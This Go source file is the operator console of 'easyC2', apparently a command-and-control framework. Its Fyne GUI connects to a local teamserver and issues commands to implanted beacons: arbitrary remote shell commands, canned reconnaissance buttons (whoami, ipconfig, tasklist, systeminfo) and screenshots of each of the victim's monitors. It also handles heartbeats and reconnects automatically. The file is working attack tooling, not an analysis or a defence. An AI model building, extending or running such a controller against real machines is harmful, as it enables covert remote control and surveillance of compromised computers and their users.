package main

import (
	"easyC2/common"
	"bytes"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"image"
	_ "image"
	"image/color"
	_ "image/jpeg"
	"image/png"
	_ "image/png"
	"io/ioutil"
	"net"
	"os"
	"strings"
	"time"
)

const ServerAddr = "127.0.0.1:50050"

// 全局变量用于从ReadConn访问UI组件
// 全局变量
var (
	globalOutputText    *widget.Entry
	globalImgContainer  *fyne.Container
	globalTabs          *container.AppTabs
	screenshotFilePaths []string
	myApp               fyne.App    // 新增全局App变量
	mainWindow          fyne.Window // 新增全局Window变量
	globalBeaconConn    *common.BeaconConnection // 全局beacon连接
)

// GbkToUtf8 将GBK编码的字节转换为UTF-8
func GbkToUtf8(gbk []byte) ([]byte, error) {
	decoder := simplifiedchinese.GBK.NewDecoder()
	utf8Reader := transform.NewReader(bytes.NewReader(gbk), decoder)
	return ioutil.ReadAll(utf8Reader)
}

func ReadConn(beaconConn *common.BeaconConnection) {
	for {
		msg, err := beaconConn.ReadMessage()
		if err != nil {
			fmt.Println("读取服务器响应失败:", err)
			globalOutputText.SetText(globalOutputText.Text + "\n连接断开: " + err.Error())

			// 尝试自动重连
			go func() {
				time.Sleep(5 * time.Second)
				newConn, dialErr := net.Dial("tcp", ServerAddr)
				if dialErr == nil {
					// 创建新的beacon连接
					newBeaconConn := common.NewBeaconConnection(newConn)
					
					// 执行握手
					err := newBeaconConn.PerformHandshake()
					if err != nil {
						fmt.Println("重连握手失败:", err)
						return
					}

					// 执行密钥交换
					err = newBeaconConn.PerformKeyExchange()
					if err != nil {
						fmt.Println("重连密钥交换失败:", err)
						return
					}

					globalBeaconConn = newBeaconConn
					globalOutputText.SetText(globalOutputText.Text + "\n已重新连接到服务器")
					go ReadConn(newBeaconConn)
				}
			}()
			return
		}

		// 处理不同类型的消息
		switch msg.Type {
		case common.BeaconData:
			message := string(msg.Payload)
			
			// 检查是否是截图文件路径
			if strings.HasPrefix(message, "SCREENSHOT_FILES:") {
				handleScreenshotFiles(message)
			} else {
				// 普通文本消息
				displayCommandOutput(msg.Payload)
			}

		case common.BeaconHeartbeat:
			// 回复心跳
			beaconConn.SendMessage(common.BeaconHeartbeatAck, []byte("heartbeat_ack"))

		default:
			fmt.Printf("收到未知消息类型: %d\n", msg.Type)
		}
	}
}

// 处理截图文件路径
func handleScreenshotFiles(message string) {
	// 提取文件路径
	pathsStr := strings.TrimPrefix(message, "SCREENSHOT_FILES:")
	filePaths := strings.Split(pathsStr, ";")

	if len(filePaths) == 0 {
		globalOutputText.SetText(globalOutputText.Text + "\n未接收到任何截图文件路径")
		return
	}

	// 更新全局变量，存储文件路径供其他函数使用
	screenshotFilePaths = filePaths

	fmt.Printf("收到 %d 个截图文件路径\n", len(filePaths))

	// 创建网格布局显示多个截图缩略图
	var screenGrid *fyne.Container

	// 根据截图数量决定布局列数
	if len(filePaths) == 1 {
		// 只有一个截图，使用单列布局
		screenGrid = container.NewVBox()
	} else {
		// 多个截图，使用二列网格布局
		screenGrid = container.NewGridWithColumns(2)
	}

	for i, path := range filePaths {
		// 检查文件是否存在并可读
		if _, err := os.Stat(path); os.IsNotExist(err) {
			fmt.Printf("警告: 截图文件不存在: %s\n", path)
			continue
		}

		// 创建显示截图的容器
		screenContainer := container.NewVBox()

		// 添加标签
		label := widget.NewLabelWithStyle(
			fmt.Sprintf("显示器 #%d", i+1),
			fyne.TextAlignCenter,
			fyne.TextStyle{Bold: true},
		)

		// 从文件加载图像
		img := canvas.NewImageFromFile(path)
		img.FillMode = canvas.ImageFillContain

		// 为图像创建一个点击事件
		imgButton := widget.NewButton("", func() {
			// 捕获当前路径，避免闭包问题
			currentPath := path
			// 点击时全屏显示图像
			showFullscreenImage(currentPath)
		})
		imgButton.Importance = widget.LowImportance // 去除按钮外观

		// 创建自定义控件组合图像和按钮
		imgContainer := container.NewStack(
			img,       // 显示图像
			imgButton, // 响应点击
		)

		// 添加到容器
		screenContainer.Add(label)
		screenContainer.Add(imgContainer)

		// 添加到网格
		screenGrid.Add(screenContainer)
	}

	// 更新图片容器
	globalImgContainer.RemoveAll()
	globalImgContainer.Add(container.NewScroll(screenGrid))
	globalImgContainer.Refresh()

	// 切换到截图选项卡
	globalTabs.SelectIndex(1)
}

// 显示命令输出
func displayCommandOutput(data []byte) {
	utf8, err := GbkToUtf8(data)
	if err != nil {
		fmt.Println("编码转换错误:", err)
		globalOutputText.SetText(globalOutputText.Text + "\n[编码错误]")
		return
	}

	output := string(utf8)

	// 高亮显示命令
	if strings.HasPrefix(output, ">") {
		output = fmt.Sprintf("\n%s", output)
	} else {
		// 原始输出添加换行
		output = fmt.Sprintf("\n%s", output)
	}

	// 追加文本而不是替换
	globalOutputText.SetText(globalOutputText.Text + output)

	// 切换到输出选项卡并滚动到最底部
	globalTabs.SelectIndex(0)
}

// 显示截图
func displayScreenshot(data []byte) {
	fmt.Println("尝试显示截图数据...")

	// 先尝试解码，确保是有效的图像数据
	img, format, err := image.Decode(bytes.NewReader(data))
	if err != nil {
		fmt.Println("图像解码失败:", err)
		globalOutputText.SetText(globalOutputText.Text + "\n截图显示失败: " + err.Error())

		// 尝试以临时文件方式保存并加载
		tempFile, err := ioutil.TempFile("", "screenshot_*.png")
		if err != nil {
			fmt.Println("创建临时文件失败:", err)
			return
		}
		defer tempFile.Close()
		defer os.Remove(tempFile.Name())

		// 写入临时文件
		if err := png.Encode(tempFile, img); err != nil {
			fmt.Println("PNG编码失败:", err)
			return
		}

		// 从临时文件加载图像
		canvasImg := canvas.NewImageFromFile(tempFile.Name())
		canvasImg.FillMode = canvas.ImageFillContain

		// 更新图片容器
		globalImgContainer.RemoveAll()
		globalImgContainer.Add(canvasImg)
		globalImgContainer.Refresh()

		// 切换到截图选项卡
		globalTabs.SelectIndex(1)
		return
	}

	fmt.Printf("成功解码图像，格式: %s\n", format)

	// 创建临时文件保存图像
	tempFile, err := ioutil.TempFile("", "screenshot_*.png")
	if err != nil {
		fmt.Println("创建临时文件失败:", err)
		return
	}
	defer tempFile.Close()
	defer os.Remove(tempFile.Name())

	// 编码为PNG并保存
	if err := png.Encode(tempFile, img); err != nil {
		fmt.Println("PNG编码失败:", err)
		return
	}

	// 从临时文件加载图像
	canvasImg := canvas.NewImageFromFile(tempFile.Name())
	canvasImg.FillMode = canvas.ImageFillContain

	// 更新图片容器
	globalImgContainer.RemoveAll()
	globalImgContainer.Add(canvasImg)
	globalImgContainer.Refresh()

	// 切换到截图选项卡
	globalTabs.SelectIndex(1)
}

func sendCommand(beaconConn *common.BeaconConnection, cmd string) {
	err := beaconConn.SendData([]byte(cmd))
	if err != nil {
		fmt.Println("发送命令失败:", err)
		globalOutputText.SetText(globalOutputText.Text + "\n发送命令失败: " + err.Error())
		return
	}
	fmt.Println("已发送命令:", cmd)
	// 显示已发送的命令
	globalOutputText.SetText(globalOutputText.Text + "\n> " + cmd)
}

// 创建命令面板
func createCommandPanel(beaconConn *common.BeaconConnection) fyne.CanvasObject {
	// 命令输入
	commandEntry := widget.NewMultiLineEntry()
	commandEntry.SetPlaceHolder("输入命令...")
	commandHistory := []string{}
	// 快捷命令按钮
	screenshotBtn := widget.NewButton("截图", func() {
		sendCommand(beaconConn, "screenshot")
	})

	ipConfigBtn := widget.NewButton("IP配置", func() {
		sendCommand(beaconConn, "shell ipconfig")
	})

	whoamiBtn := widget.NewButton("当前用户", func() {
		sendCommand(beaconConn, "shell whoami")
	})

	dirBtn := widget.NewButton("列出文件", func() {
		sendCommand(beaconConn, "shell dir")
	})

	processBtn := widget.NewButton("进程列表", func() {
		sendCommand(beaconConn, "shell tasklist")
	})

	systemInfoBtn := widget.NewButton("系统信息", func() {
		sendCommand(beaconConn, "shell systeminfo")
	})

	// 执行按钮
	executeBtn := widget.NewButtonWithIcon("执行", theme.MediaPlayIcon(), func() {
		cmd := commandEntry.Text
		if cmd != "" {
			if !strings.HasPrefix(cmd, "shell ") && cmd != "screenshot" {
				cmd = "shell " + cmd
			}
			sendCommand(beaconConn, cmd)
			commandHistory = append(commandHistory, cmd)

			commandEntry.SetText("")
		}
	})

	// 清除按钮
	clearBtn := widget.NewButtonWithIcon("清除", theme.ContentClearIcon(), func() {
		commandEntry.SetText("")
	})

	// 快捷命令面板
	quickCmds := container.NewGridWithColumns(2,
		screenshotBtn, ipConfigBtn,
		whoamiBtn, dirBtn,
		processBtn, systemInfoBtn,
	)

	// 按钮面板
	buttons := container.NewHBox(
		executeBtn,
		clearBtn,
	)

	// 设置键盘快捷键处理
	commandEntry.OnSubmitted = func(cmd string) {
		if cmd != "" {
			if !strings.HasPrefix(cmd, "shell ") && cmd != "screenshot" {
				cmd = "shell " + cmd
			}
			sendCommand(beaconConn, cmd)
			commandHistory = append(commandHistory, cmd)

			commandEntry.SetText("")
		}
	}

	// 命令面板
	return container.NewBorder(
		container.NewVBox(
			widget.NewLabelWithStyle("命令控制", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
			widget.NewSeparator(),
			quickCmds,
		),
		buttons,
		nil, nil,
		container.NewVBox(
			widget.NewLabel("命令输入:"),
			container.NewScroll(commandEntry),
		),
	)
}

// 创建输出/截图显示面板
func createOutputPanel(beaconConn *common.BeaconConnection, myapp fyne.App, window fyne.Window) fyne.CanvasObject {
	// 使用选项卡显示文本输出和截图
	tabs := container.NewAppTabs()

	// 文本输出选项卡
	outputText := widget.NewMultiLineEntry()
	outputText.SetPlaceHolder("命令输出将显示在这里...")
	outputText.Disable()

	// 清除输出按钮
	clearOutputBtn := widget.NewButton("清除输出", func() {
		outputText.SetText("")
	})

	// 截图显示选项卡 - 初始为空白
	imgContainer := container.NewMax()

	// 截图选项卡的按钮
	saveBtn := widget.NewButton("保存截图", func() {
		if len(screenshotFilePaths) == 0 {
			dialog.ShowInformation("提示", "没有可保存的截图", window)
			return
		}

		// 如果只有一个截图，直接选择保存位置
		if len(screenshotFilePaths) == 1 {
			dialog.ShowFileSave(func(writer fyne.URIWriteCloser, err error) {
				if err != nil || writer == nil {
					return
				}
				defer writer.Close()

				// 读取原始文件并写入选择的位置
				data, err := ioutil.ReadFile(screenshotFilePaths[0])
				if err != nil {
					dialog.ShowError(err, window)
					return
				}

				writer.Write(data)
				dialog.ShowInformation("成功", "截图保存成功", window)
			}, window)
			return
		}

		// 如果有多个截图，先显示选择对话框
		var options []string
		for i := range screenshotFilePaths {
			options = append(options, fmt.Sprintf("显示器 #%d", i+1))
		}

		selectWidget := widget.NewSelect(options, nil)

		dialog.ShowCustomConfirm("选择要保存的截图", "保存", "取消",
			selectWidget, func(save bool) {
				if !save || selectWidget.Selected == "" {
					return
				}

				// 从选择中提取索引
				var index int
				fmt.Sscanf(selectWidget.Selected, "显示器 #%d", &index)
				index-- // 调整为0基索引

				if index >= 0 && index < len(screenshotFilePaths) {
					// 为选择的截图显示保存对话框
					dialog.ShowFileSave(func(writer fyne.URIWriteCloser, err error) {
						if err != nil || writer == nil {
							return
						}
						defer writer.Close()

						data, err := ioutil.ReadFile(screenshotFilePaths[index])
						if err != nil {
							dialog.ShowError(err, window)
							return
						}

						writer.Write(data)
						dialog.ShowInformation("成功", "截图保存成功", window)
					}, window)
				}
			}, window)
	})

	fullscreenBtn := widget.NewButton("全屏查看", func() {
		if len(screenshotFilePaths) == 0 {
			dialog.ShowInformation("提示", "没有可显示的截图", window)
			return
		}

		// 如果只有一个截图，直接全屏显示
		if len(screenshotFilePaths) == 1 {
			showFullscreenImage(screenshotFilePaths[0])
			return
		}

		// 如果有多个截图，先显示选择对话框
		var options []string
		for i := range screenshotFilePaths {
			options = append(options, fmt.Sprintf("显示器 #%d", i+1))
		}

		selectWidget := widget.NewSelect(options, nil)

		dialog.ShowCustomConfirm("选择要全屏显示的截图", "显示", "取消",
			selectWidget, func(show bool) {
				if !show || selectWidget.Selected == "" {
					return
				}

				// 从选择中提取索引
				var index int
				fmt.Sscanf(selectWidget.Selected, "显示器 #%d", &index)
				index-- // 调整为0基索引

				if index >= 0 && index < len(screenshotFilePaths) {
					showFullscreenImage(screenshotFilePaths[index])
				}
			}, window)
	})

	refreshBtn := widget.NewButton("刷新截图", func() {
		sendCommand(beaconConn, "screenshot")
	})

	// 截图控制按钮布局
	screenshotControls := container.NewHBox(
		saveBtn, fullscreenBtn, refreshBtn,
	)

	// 输出控制按钮布局
	outputControls := container.NewHBox(
		clearOutputBtn,
	)

	// 添加选项卡
	tabs.Append(container.NewTabItem("命令输出",
		container.NewBorder(nil, outputControls, nil, nil, container.NewScroll(outputText))))

	tabs.Append(container.NewTabItem("远程截图",
		container.NewBorder(nil, screenshotControls, nil, nil, container.NewScroll(imgContainer))))

	// 设置全局访问点，以便ReadConn可以更新UI
	globalOutputText = outputText
	globalImgContainer = imgContainer
	globalTabs = tabs

	return container.NewBorder(
		widget.NewLabelWithStyle("输出显示", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		nil, nil, nil,
		tabs,
	)
}

// 显示全屏图像
func showFullscreenImage(imagePath string) {
	fmt.Println("全屏显示图像:", imagePath)

	// 检查文件是否存在
	if _, err := os.Stat(imagePath); os.IsNotExist(err) {
		fmt.Println("错误: 图像文件不存在:", imagePath)
		return
	}

	// 创建全屏窗口
	fullWin := myApp.NewWindow("全屏截图")

	// 从文件加载图像
	img := canvas.NewImageFromFile(imagePath)
	img.FillMode = canvas.ImageFillContain

	// 添加关闭按钮
	closeBtn := widget.NewButton("关闭", func() {
		fullWin.Close()
	})

	// 创建布局，将关闭按钮放在底部
	content := container.NewBorder(
		nil,
		container.NewCenter(closeBtn),
		nil, nil,
		container.NewScroll(img),
	)

	fullWin.SetContent(content)

	// 设置窗口大小为全屏或近似全屏
	fullWin.Resize(fyne.NewSize(1200, 800))
	fullWin.CenterOnScreen()

	// 添加ESC键退出全屏
	fullWin.Canvas().SetOnTypedKey(func(key *fyne.KeyEvent) {
		if key.Name == fyne.KeyEscape {
			fullWin.Close()
		}
	})

	fullWin.Show()
}

// myDarkTheme 结构体嵌入了 fyne 的内置暗黑主题
type myDarkTheme struct {
	fyne.Theme // 嵌入基础主题
}

// 确保 myDarkTheme 实现了 fyne.Theme 接口
var _ fyne.Theme = (*myDarkTheme)(nil)

// 返回一个新的 myDarkTheme 实例
func newMyDarkTheme() fyne.Theme {
	return &myDarkTheme{Theme: theme.DarkTheme()}
}

// Color 方法是自定义主题的核心
func (m *myDarkTheme) Color(name fyne.ThemeColorName, variant fyne.ThemeVariant) color.Color {
	switch name {
	case theme.ColorNameBackground:
		return color.NRGBA{R: 0x1a, G: 0x1a, B: 0x1a, A: 0xff} // 深灰色背景
	case theme.ColorNameForeground:
		return color.NRGBA{R: 0xff, G: 0xff, B: 0xff, A: 0xff} // 纯白色文本
	case theme.ColorNamePrimary:
		return color.NRGBA{R: 0x00, G: 0x88, B: 0xff, A: 0xff} // 亮蓝色
	case theme.ColorNameInputBackground:
		return color.NRGBA{R: 0x22, G: 0x22, B: 0x22, A: 0xff} // 略亮的背景
	case theme.ColorNameButton:
		return color.NRGBA{R: 0x33, G: 0x33, B: 0x33, A: 0xff} // 按钮背景
	case theme.ColorNameDisabled:
		return color.NRGBA{R: 0x80, G: 0x80, B: 0x80, A: 0xff} // 较亮的灰色
	case theme.ColorNamePlaceHolder:
		return color.NRGBA{R: 0xa0, G: 0xa0, B: 0xa0, A: 0xff} // 更亮的占位符
	default:
		return m.Theme.Color(name, variant) // 使用基础主题的颜色
	}
}

func getStatusBar(beaconConn *common.BeaconConnection) fyne.CanvasObject {
	statusLabel := widget.NewLabel("状态: 已连接")

	// 更新时间的goroutine
	go func() {
		for {
			currentTime := time.Now().Format("2006-01-02 15:04:05")
			statusLabel.SetText(fmt.Sprintf("状态: 已连接 | 时间: %s", currentTime))
			time.Sleep(1 * time.Second)
		}
	}()

	return container.NewHBox(
		statusLabel,
	)
}

func main() {
	myApp = app.New() // 初始化全局App变量
	myApp.Settings().SetTheme(newMyDarkTheme())
	window := myApp.NewWindow("Easy C2 控制台")
	mainWindow = window // 初始化全局Window变量
	window.Resize(fyne.NewSize(1000, 700))

	// 连接到服务器
	dial, err := net.Dial("tcp", ServerAddr)
	if err != nil {
		dialog.ShowError(fmt.Errorf("连接服务器失败: %v", err), window)
		// 创建一个重试按钮
		retryBtn := widget.NewButton("重试连接", func() {
			newDial, dialErr := net.Dial("tcp", ServerAddr)
			if dialErr != nil {
				dialog.ShowError(fmt.Errorf("重连失败: %v", dialErr), window)
				return
			}

			// 创建新的beacon连接
			newBeaconConn := common.NewBeaconConnection(newDial)
			
			// 执行握手
			err := newBeaconConn.PerformHandshake()
			if err != nil {
				dialog.ShowError(fmt.Errorf("握手失败: %v", err), window)
				return
			}

			// 执行密钥交换
			err = newBeaconConn.PerformKeyExchange()
			if err != nil {
				dialog.ShowError(fmt.Errorf("密钥交换失败: %v", err), window)
				return
			}

			globalBeaconConn = newBeaconConn

			// 重新设置UI并启动监听
			splitContainer := container.NewHSplit(
				createCommandPanel(newBeaconConn),
				createOutputPanel(newBeaconConn, myApp, window),
			)
			splitContainer.Offset = 0.3

			statusBar := getStatusBar(newBeaconConn)

			window.SetContent(
				container.NewBorder(nil, statusBar, nil, nil, splitContainer),
			)

			go ReadConn(newBeaconConn)

			dialog.ShowInformation("成功", "已连接到服务器", window)
		})

		window.SetContent(container.NewCenter(
			container.NewVBox(
				widget.NewLabelWithStyle("无法连接到服务器", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
				retryBtn,
			),
		))
		window.ShowAndRun()
		return
	}

	// 创建beacon连接
	beaconConn := common.NewBeaconConnection(dial)
	
	// 执行握手
	err = beaconConn.PerformHandshake()
	if err != nil {
		dialog.ShowError(fmt.Errorf("握手失败: %v", err), window)
		dial.Close()
		return
	}

	// 执行密钥交换
	err = beaconConn.PerformKeyExchange()
	if err != nil {
		dialog.ShowError(fmt.Errorf("密钥交换失败: %v", err), window)
		dial.Close()
		return
	}

	globalBeaconConn = beaconConn

	// 创建一个水平分割的主布局
	splitContainer := container.NewHSplit(
		createCommandPanel(beaconConn),
		createOutputPanel(beaconConn, myApp, window),
	)
	splitContainer.Offset = 0.3 // 30% 的空间给左侧

	// 状态栏
	statusBar := getStatusBar(beaconConn)

	// 设置主窗口内容
	window.SetContent(
		container.NewBorder(nil, statusBar, nil, nil, splitContainer),
	)

	// 开始监听服务器响应
	go ReadConn(beaconConn)

	// 显示窗口并运行应用
	window.ShowAndRun()
}
